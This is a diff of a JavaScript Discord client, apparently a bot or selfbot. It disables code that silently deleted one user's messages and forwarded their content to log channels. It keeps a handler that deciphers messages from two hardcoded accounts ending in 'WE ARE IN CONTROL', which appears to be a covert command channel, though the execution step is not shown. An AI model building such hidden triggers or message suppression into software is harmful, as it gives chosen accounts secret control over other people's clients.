@@ -192,20 +192,13 @@ async function wsConnect(startmsg){
     if(req.t==='MESSAGE_CREATE'){
 
       
-      if(req.d.author.id=='982875001550168064'){
-        await delMsg(req.d.id,req.d.channel_id)
-        await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1184757498067042366')
-        return await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1337034823000133652')
-      }
+      // if(req.d.author.id=='982875001550168064'){
+      //   await delMsg(req.d.id,req.d.channel_id)
+      //   await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1184757498067042366')
+      //   return await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1337034823000133652')
+      // }
       
       if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){
-/*
-console.log('`'+new enc.Cipher(
-
-'sendMsg(`# WE ARE IN CONTROL`,`1318046960174764165`)'
-
-+'WE ARE IN CONTROL',enc.b95).setCharset(enc.chant).text+'`')
-*/
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(new enc.Charset(enc.b95+'\n')).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
           console.log('')
@@ -240,7 +233,7 @@ console.log('`'+new enc.Cipher(
       return updateSave()
     }
 
-    console.log('unknown ws:',req)
+    console.log('unknown ws:',req.t,req.op)
   });
   ws.onclose=async(e)=>{console.warn('ws close',e);if(![1001,1006].includes(Number(e.code))){wsConnect(`kana reconnecting from ws error code:${e.code} reason:"${e.reason}"`)}else{wsConnect()}};
   ws.on('error',async(e)=>{console.warn('ws error',e,e.message);ws.close()});
